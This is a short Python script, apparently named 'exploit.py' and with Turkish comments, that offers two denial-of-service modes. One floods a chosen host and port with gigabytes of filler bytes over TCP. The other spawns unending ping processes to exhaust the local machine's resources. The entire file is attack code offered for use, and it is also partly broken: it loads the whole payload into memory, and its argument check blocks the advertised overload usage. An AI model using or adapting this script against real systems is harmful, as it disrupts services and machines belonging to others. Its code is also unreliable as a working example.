import socket
import sys
import subprocess

def send_large_data(lhost, lport, size_in_gb):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    
    # Büyük veri parçası oluştur ve gönder
    large_data = b'A' * (size_in_gb * 1024 * 1024 * 1024)  # GB cinsinden veri
    s.sendall(large_data)
    
    s.close()
    print(f"Large data sent successfully to {lhost}:{lport}.")

def overload_system():
    try:
        # CPU ve bellek tüketimini artır
        while True:
            subprocess.Popen(["ping", "-t", "localhost"])
    except Exception as e:
        print(f"Error: {e}")

def print_usage():
    print("Usage: python exploit.py LHOST=<ip> LPORT=<port> [--data <size_in_gb> | --overload]")
    print("  --data <size_in_gb> : Send a large amount of data.")
    print("  --overload          : Overload the system resources.")

def main():
    if len(sys.argv) < 5:
        print_usage()
        return

    lhost = None
    lport = None
    data_size = None
    option = None

    # Komut satırı argümanlarını işle
    for arg in sys.argv[1:]:
        if arg.startswith('LHOST='):
            lhost = arg.split('=')[1]
        elif arg.startswith('LPORT='):
            lport = int(arg.split('=')[1])
        elif arg == '--data':
            option = '--data'
        elif arg == '--overload':
            option = '--overload'
        elif option == '--data':
            try:
                data_size = int(arg)
            except ValueError:
                print("Invalid size_in_gb value. Must be an integer.")

    if lhost is None or lport is None:
        print_usage()
        return

    if option == '--data':
        if data_size is None:
            print_usage()
            return
        send_large_data(lhost, lport, data_size)
    elif option == '--overload':
        overload_system()
    else:
        print_usage()

if __name__ == "__main__":
    main()